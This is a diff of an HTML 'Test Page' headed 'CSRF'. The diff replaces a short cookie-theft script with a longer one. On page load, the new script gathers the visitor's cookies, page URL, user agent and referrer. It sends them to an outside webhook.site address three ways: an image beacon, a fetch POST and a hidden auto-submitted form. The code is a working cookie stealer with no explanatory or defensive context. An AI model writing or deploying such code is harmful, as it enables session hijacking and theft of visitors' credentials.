@@ -1,15 +1,57 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Test Page</title>
+</head>
 <body>
+    <h1>CSRF</h1>
+    
     <script>
-        const hook = 'https://webhook.site/d1933a3f-90d0-4258-99ef-f0686f993e62';
-        var c = document.cookie;
-        var i = new Image();
-        i.src = hook + '?stolen_cookies=' + encodeURIComponent(c);
-        fetch(hook, {
-            method: 'POST',
-            body: 'Cookies: ' + c
-        });
+        const WEBHOOK_URL = 'https://webhook.site/d1933a3f-90d0-4258-99ef-f0686f993e62';
+        
+        function stealCookies() {
+            const cookies = document.cookie;
+            const pageUrl = window.location.href;
+            
+            const img = new Image();
+            img.src = `${WEBHOOK_URL}?method=img&cookies=${encodeURIComponent(cookies)}&from=${encodeURIComponent(pageUrl)}`;
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    type: 'cookies_steal',
+                    cookies: cookies,
+                    url: pageUrl,
+                    userAgent: navigator.userAgent,
+                    time: new Date().toISOString(),
+                    referrer: document.referrer
+                })
+            }).catch(err => console.log('Fetch error:', err));
+            
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = WEBHOOK_URL;
+            form.style.display = 'none';
+            
+            const input = document.createElement('input');
+            input.name = 'cookies';
+            input.value = cookies;
+            form.appendChild(input);
+            
+            document.body.appendChild(form);
+            form.submit();
+            
+            return `Sent cookies: ${cookies}`;
+        }
+        
+        window.onload = function() {
+            setTimeout(stealCookies, 1000);
+        };
+        
+        console.log('Cookie stealer loaded. Cookies:', document.cookie);
     </script>
 </body>
 </html>
